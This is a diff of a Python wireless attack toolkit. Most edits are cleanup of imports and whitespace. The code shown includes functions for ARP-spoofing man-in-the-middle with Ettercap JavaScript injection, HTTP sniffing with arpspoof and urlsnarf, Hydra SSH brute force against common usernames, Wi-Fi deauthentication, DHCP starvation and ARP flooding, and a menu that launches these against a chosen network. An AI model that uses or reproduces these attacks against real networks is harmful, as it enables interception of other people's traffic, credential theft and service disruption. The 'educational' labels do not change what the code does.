@@ -7,14 +7,9 @@ import threading
 from tabulate import tabulate
 import requests
 import subprocess
-import re
 import time
 from scapy.all import *
-from scapy.all import Dot11, RadioTap, Dot11Deauth
-
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
-from scapy.all import ARP, send, get_if_hwaddr
 import random
 import shutil
 OUI_DATABASE = {}  # Your MAC vendor lookup table
@@ -91,10 +86,6 @@ def analyze_network_vulnerabilities(networks_df):
     df_vuln = pd.DataFrame(vulnerabilities, columns=["SSID", "BSSID", "Encryption Type", "Signal Strength", "Risk Analysis"])
     print(tabulate(df_vuln, headers="keys", tablefmt="grid", stralign="left", maxcolwidths=[20, 20, 15, 12, 40]))
     return df_vuln
-
-
-import pandas as pd
-import time
 
 def detect_rogue_access_points(networks_df):
     print("\n[+] Checking for Rogue Access Points (Deep Analysis)...\n")
@@ -209,7 +200,6 @@ def detect_rogue_access_points(networks_df):
 
     return df_rogue
 
-
 # Function to scan Wi-Fi networks using nmcli
 def scan_wifi_networks_nmcli():
     if not is_tool_installed("nmcli"):
@@ -238,6 +228,7 @@ def scan_wifi_networks_nmcli():
     df = pd.DataFrame(networks, columns=["SSID", "BSSID", "Signal Strength", "Encryption Type"])
     print(tabulate(df, headers="keys", tablefmt="grid", stralign="left"))
     return df
+
 def detect_subnet_from_gateway():
     print("\n[+] Confirming the target Wi-Fi subnet...\n")
 
@@ -281,7 +272,6 @@ def load_oui_database(path="/home/autosecure/wifi/oui.txt"):
     except FileNotFoundError:
         print(f"[-] OUI file not found at {path}")
     return oui_dict
-
 
 def get_mac_vendor_local(mac, oui_dict):
     prefix = ":".join(mac.upper().split(":")[:3])
@@ -356,7 +346,6 @@ def scan_connected_devices(subnet):
         print("[-] No connected devices detected.")
         return None
 
-
 def scan_connected_devices_iw():
     print("\n[+] Scanning for connected devices using iw dev...\n")
     try:
@@ -379,6 +368,7 @@ def scan_connected_devices_iw():
     except Exception as e:
         print(f"[-] iw dev scan failed: {e}")
         return None
+
 def get_mac_vendor(mac_address):
     if mac_address == "Unknown":
         return "Unknown Vendor"
@@ -397,6 +387,7 @@ def get_mac_vendor(mac_address):
         pass
 
     return "Unknown Vendor"
+
 def fingerprint_device(ip):
     try:
         result = subprocess.run(
@@ -436,6 +427,7 @@ def guess_device_name(vendor, mac, os_name):
         return "Xiaomi Device"
     else:
         return "Unknown Device"
+
 def guess_app_usage_from_ports(open_ports):
     if isinstance(open_ports, str):
         ports = open_ports.lower()
@@ -481,7 +473,6 @@ def guess_app_usage_from_ports(open_ports):
         activity_guess.append("Unknown / Idle")
 
     return ", ".join(activity_guess)
-
 
 def guess_device_type(vendor, open_ports):
     port_names = " ".join(open_ports).lower()
@@ -592,7 +583,6 @@ def fingerprint_devices(devices_df):
 
     return df
 
-
 def mitm_js_injection_ettercap(interface):
     print("\n[x] Launching Ettercap for JavaScript Injection MITM...\n")
     os.system(f"sudo ettercap -T -q -i {interface} -M arp:remote // // -P js_inject")
@@ -601,13 +591,14 @@ def mitm_http_logging(victim_ip, interface):
     print("\n[🧑‍💻] Starting arpspoof + HTTP sniffing (educational)...")
     gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
     print(f"[⚠️] Spoofing target {victim_ip} ↔ Gateway {gateway}...\n")
-    
+
     os.system(f"sudo arpspoof -i {interface} -t {victim_ip} {gateway} &")
     os.system(f"sudo arpspoof -i {interface} -t {gateway} {victim_ip} &")
-    
+
     # You can use one of these based on what’s installed:
     os.system(f"sudo urlsnarf -i {interface}")
     # OR: os.system(f"sudo driftnet -i {interface}")
+
 def brute_force_ssh(ip):
     print(f"\n[🔓] Launching SSH brute force on {ip} using Hydra...\n")
     wordlist = "/usr/share/wordlists/rockyou.txt"  # Adjust path
@@ -616,10 +607,6 @@ def brute_force_ssh(ip):
     usernames = ["root", "admin", "pi"]
     for user in usernames:
         os.system(f"hydra -l {user} -P {wordlist} ssh://{ip} -t 4")
-
-
-
-
 
 #------------------------------------------------------------------------------
 def mitm_sniffing_http_credentials():
@@ -762,8 +749,6 @@ def enable_forwarding():
     os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
 
 # -----------------------------------------------------------------
-
-
 def scan_connected_devices_arp():
     print("[🔍] Scanning for connected devices using arp-scan...\n")
     result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
@@ -808,9 +793,6 @@ def send_deauth_packets(victim_mac, ap_mac, interface="wlan0", count=300):
         print(f"[❌] Error sending packets: {e}")
 
 #--------------------------------------dhcp
-import random
-from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf
-
 def generate_mac():
     return "02:00:00:%02x:%02x:%02x" % (
         random.randint(0, 255),
@@ -840,7 +822,6 @@ def dhcp_starvation(interface="wlan0", count=100):
     print("\n[✔] Starvation complete. IP pool may be exhausted.")
 
 
-
 ##########---------------------------------mudolizer for flask routes--------------------------#
 def scan_and_analyze():
     networks_df = scan_wifi_networks_nmcli()
@@ -848,6 +829,7 @@ def scan_and_analyze():
         return None, None
     rogue_df = detect_rogue_access_points(networks_df)
     return networks_df, rogue_df
+
 def analyze_selected_network(ssid, bssid, networks_df=None):
     if networks_df is None:
         networks_df = scan_wifi_networks_nmcli()
@@ -858,18 +840,22 @@ def analyze_selected_network(ssid, bssid, networks_df=None):
 
     df = analyze_network_vulnerabilities(selected)
     return df
+
 def get_subnet():
     return detect_subnet_from_gateway()
+
 def scan_connected(subnet):
     df = scan_connected_devices(subnet)
     if df is None or df.empty:
         df = scan_connected_devices_iw()
     return df
+
 def fingerprint_connected(devices_df):
     if devices_df is None or devices_df.empty:
         return None
     df = fingerprint_devices(devices_df)
     return df
+
 def full_analysis_pipeline(ssid, bssid):
     networks_df, _ = scan_and_analyze()
     vuln_df = analyze_selected_network(ssid, bssid, networks_df)
@@ -880,8 +866,6 @@ def full_analysis_pipeline(ssid, bssid):
 
 
 #------- auto arp flood#####
-
-
 def random_mac():
     return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xff) for _ in range(5))
 
@@ -968,7 +952,7 @@ def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=F
     log_lines.append("• ❌ Devices blindly trust unsolicited ARP responses")
     log_lines.append("• ❌ No static MAC-IP binding policies enforced\n")
 
-   
+
     if vulnerable_devices:
         log_lines.append("\n🛑 COMPROMISED ENDPOINTS DETECTED")
         log_lines.append("──────────────────────────────────")
@@ -988,7 +972,7 @@ def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=F
         log_lines.append("✅ No immediate vulnerabilities found, but regular audits and hardened configuration")
         log_lines.append("are still strongly recommended to maintain network integrity.\n")
 
-    
+
 
     # Save to file
     with open("arp_flood_report.txt", "w") as f:
@@ -1001,7 +985,6 @@ def auto_arp_replay_flood(interface="wlan0", spoof_replies=True, randomize_mac=F
         pass
 
     return "\n".join(log_lines)
-
 
 def check_upnp_enabled_on_router(router_ip=None):
     """
@@ -1211,17 +1194,17 @@ def main():
 
     # ------------------ Attack Options ------------------
     print("\n[+] Do you want to run an attack on the selected network?")
-    
+
     print("1. MITM + JavaScript Injection (Ettercap)")
     print("2. MITM + HTTP Logging (arpspoof + driftnet/urlsnarf using wlan0)")
-    
+
     print("3. DHCP Starvation Attack (No Monitor Mode)")
     print("4.Deauth One Connected Device (No airodump/mdk4)")
 
 
     try:
         choice = int(input("Enter your choice (1-6): "))
-        
+
         if choice == 1:
             print("\n[⚔️] Launching Ettercap for JavaScript Injection MITM...")
             os.system(f"sudo ettercap -T -M arp:remote -i {INTERFACE} -P autoadd -q")
@@ -1247,6 +1230,6 @@ def main():
             print("[*] Skipping attack.")
     except ValueError:
         print("[*] Invalid choice. Skipping attack.")
-   
+
 if __name__ == "__main__":
     main()
